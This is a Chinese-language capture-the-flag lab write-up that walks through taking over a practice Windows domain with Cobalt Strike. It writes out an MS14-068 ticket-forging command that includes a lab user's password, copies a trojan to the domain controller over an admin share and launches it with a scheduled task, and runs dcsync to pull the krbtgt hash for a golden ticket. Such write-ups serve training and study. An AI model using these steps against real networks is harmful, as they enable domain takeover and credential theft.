### **程序员写在文章前：**

上周，我们讨论了如何使用MSF完成整个打靶过程。按照小星和大家的约定，这周我们将分享如何使用CS来进行打靶，并给大家提供黄金票据的利用方法。

##  **准备工作**

由于开端获取webshell前的操作是与利用MSF打靶的方法是一致的，在此不再重复。我们直接从获取websehll开始，查看当前主机192.168.0.3和10.10.10.150的两个网卡以及存在域环境。

![image.png](https://image.3001.net/images/20221013/1665629797_63477e6594a1b5315b536.png!small)

##  **cs打靶方式**

1\. 查看进程后发现当前主机暂未安装安全软件，因此后续也无需进行免杀操作，可以先上线cs。

![image.png](https://image.3001.net/images/20221013/1665629798_63477e669bdcc0245b465.png!small)

2\. 上线cs后扫描域内主机，发现主机10.10.10.149存活，且开启了445端口，但是目标机器不出网，暂时放弃利用永恒之蓝。

![image.png](https://image.3001.net/images/20221013/1665629799_63477e678c05b171d4c7f.png!small)

3.使用cs自带的功能dump hash和mimikatz以获取明文密码，可发现有一个域用户web的明文密码。

  

![image.png](https://image.3001.net/images/20221013/1665629801_63477e69ecb5d686e2712.png!small)

4.此处小星使用了用户web的账号密码，试图生成一个新的会话大师，但结果失败了。因此，小星使用ms14-068来提权到预控和执行下述命令以创建票据。

ms14-068.exe -u web@hackbox.com -s
S-1-5-21-2005268815-658469957-1189185684-1103 -d 10.10.10.149 -p !@#Qwe456

![image.png](https://image.3001.net/images/20221013/1665629802_63477e6ad020176090700.png!small)

5.使用KrbCredExport脚本文件，将.ccache文件转化为.kirbi 格式。

![image.png](https://image.3001.net/images/20221013/1665629803_63477e6b9523485e2c49a.png!small)

6.为票据导入之前是不可以访问dc的，导入票据后成功访问dc的标识如下所示。

kerberos_ticket_use

![image.png](https://image.3001.net/images/20221013/1665629804_63477e6c92d87bdf99ebc.png!small)

7.访问域控，利用定时任务上线cs。  
7.1首先创建一个smb 连接器，因为smb属于正向连接,所以操作相对简单。

  

![image.png](https://image.3001.net/images/20221013/1665629806_63477e6e9f345dd35d0d2.png!small)

  

7.2 upload bind.exe #上传木马到机器web上。

shell copy bind.exe [\\\dc\c$\bind.exe](%5C%5Cdc%5Cc$%5Cbind.exe)#将木马复制到dc上。

  

![image.png](https://image.3001.net/images/20221013/1665629808_63477e705b61557835393.png!small)

7.3shell net time [\\\dc](%5C%5Cdc)#查看dc当前事件

shell at \\\dc 16:52:32 c:/bind.exe #创建定时任务

  

![image.png](https://image.3001.net/images/20221013/1665629809_63477e71546b9c477489b.png!small)

7.4 在beacon执行命令link使dc成功上线。

![image.png](https://image.3001.net/images/20221013/1665629810_63477e72278715df48c9d.png!small)

7.5成功导出dc的hash和明文密码，至此域控dc已经攻克下来。

![image.png](https://image.3001.net/images/20221013/1665629811_63477e73288f6846a5430.png!small)

##  **黄金票据**

黄金票据的原理网络上已有详细的说明，这里就不展开叙述了。要创建黄金票据，需要掌握以下信息：

1.要伪造的域用户

2.域名

3.域的SID值

4.krbtgt账号的哈希值或AES-256值

 **步骤：**

1\. 首先在dc上执行命令，导出krbtgt信息“dcsync hackbox.com hackbox\krbtgt”。

  

![image.png](https://image.3001.net/images/20221013/1665629811_63477e73e8aaeee6d08d2.png!small)

2.在机器web上制作黄金票据，填入所需条件即可。注意：制作之前是无法访问dc的。

![image.png](https://image.3001.net/images/20221013/1665629812_63477e74edfb8ff25bdd9.png!small)

3.制作后成功访问dc。

![image.png](https://image.3001.net/images/20221013/1665629813_63477e75ce6a4ec6fba16.png!small)

4.获取3个flag的值。

![image.png](https://image.3001.net/images/20221013/1665629814_63477e76bece865cdea3b.png!small)

##  **总结**

小星通过此次使用cs打靶，再度拓宽了对靶场测试研究的深度，并进一步验证了黄金票据的使用方法。接下来，小星将着手探究如何利用dc的永恒之蓝，我们下期再会！

